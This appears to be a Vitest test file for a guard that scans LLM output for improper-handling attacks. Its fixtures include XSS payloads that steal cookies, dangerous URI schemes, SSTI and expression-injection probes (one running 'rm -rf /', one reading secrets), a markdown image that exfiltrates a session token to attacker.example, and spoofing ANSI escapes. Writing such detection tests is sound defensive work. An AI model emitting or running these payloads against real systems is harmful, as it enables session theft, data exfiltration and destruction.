/**
 * Improper Output Handling guard — LLM05 tests.
 * XSS/HTML, dangerous URI schemes, SSTI, markdown exfiltration, ANSI escapes;
 * benign pass-through; orchestrator routing on scope=output.
 */
import { describe, it, expect } from "vitest";
import { scanImproperOutput } from "../src/guards/improper-output";
import { createAegisGuard, ThreatType } from "../src/index";

const ESC = "\u001b"; // ANSI escape (U+001B)

describe("scanImproperOutput — active content (malicious)", () => {
  const cases: Array<[string, string]> = [
    ["script tag", "Sure! <script>fetch('/steal?c='+document.cookie)</script>"],
    ["inline event handler", `<img src=x onerror=alert(document.domain)>`],
    ["javascript: URI", `Click <a href="javascript:stealCookies()">here</a>`],
    ["vbscript: URI", `<a href="vbscript:msgbox(1)">x</a>`],
    ["data:text/html URI", `Open data:text/html;base64,PHNjcmlwdD4=`],
    ["iframe embed", `<iframe src="//evil.example/x"></iframe>`],
    ["svg embed", `<svg onload=alert(1)>`],
    ["SSTI arithmetic probe", "The answer is {{7*7}} apparently"],
    ["SSTI jinja internals", "Render {{ config.__class__.__init__ }} now"],
    ["expression injection sink", "Value: ${T(java.lang.Runtime).exec('id')}"],
    ["expression injection (node)", "Hello ${process.env.SECRET}"],
    ["scriptlet injection", "<% system('rm -rf /') %>"],
    [
      "markdown exfil link",
      "![](https://attacker.example/log?data=session_token_here)",
    ],
    ["ansi escape", `Normal text ${ESC}[2J${ESC}[1;1H spoofed prompt`],
  ];
  for (const [name, text] of cases) {
    it(`flags ${name}`, () => {
      const r = scanImproperOutput(text);
      expect(r.safe).toBe(false);
      expect(r.threatType).toBe(ThreatType.IMPROPER_OUTPUT);
      expect(r.score).toBeGreaterThanOrEqual(80);
    });
  }
});

describe("scanImproperOutput — benign pass-through (no false positives)", () => {
  const benign = [
    "Here is a code review of your TypeScript function.",
    "Use the array index like arr[0] and arr[1;2] is not valid syntax.",
    "The javascript: protocol should be avoided in user-supplied links.",
    "In React, pass props like <Component prop={value} /> to render.",
    "Template literals use ${variable} for interpolation in plain JS.",
    "Render the markdown image ![logo](https://cdn.example/logo.png) inline.",
    "The HTML <section> and <article> tags are semantic containers.",
    "Math expression: result = {{ total }} (handlebars placeholder, no payload).",
  ];
  for (const text of benign) {
    it(`passes: "${text.slice(0, 40)}…"`, () => {
      const r = scanImproperOutput(text);
      expect(r.safe).toBe(true);
      expect(r.score).toBe(0);
    });
  }
});

describe("AegisGuard routing — LLM05", () => {
  const aegis = createAegisGuard({ enabled: true });

  it("routes XSS output to LLM05 and returns a sanitized copy", async () => {
    const r = await aegis.scan("<script>alert(1)</script>", { scope: "output" });
    expect(r.safe).toBe(false);
    expect(r.threatType).toBe(ThreatType.IMPROPER_OUTPUT);
    expect(typeof r.sanitized).toBe("string");
  });

  it("does not run on input scope (output-handling is post-LLM)", async () => {
    const r = await aegis.scan("<script>alert(1)</script>", { scope: "input" });
    // No input-scope detector owns raw HTML, so it passes the input pipeline.
    expect(r.threatType).not.toBe(ThreatType.IMPROPER_OUTPUT);
  });
});
